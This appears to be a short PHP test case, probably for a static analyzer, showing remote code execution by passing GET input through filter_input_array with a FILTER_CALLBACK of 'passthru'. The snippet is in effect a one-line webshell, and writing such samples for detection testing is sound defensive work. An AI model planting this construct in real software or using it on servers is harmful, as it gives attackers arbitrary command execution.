--TEST--
RCE via filter_input_array + FILTER_CALLBACK + 'passthru'
--FILE--
<?php
$x = filter_input_array(INPUT_GET, ['x' => ['filter' => FILTER_CALLBACK, 'options' => 'passthru']]);
return $x;
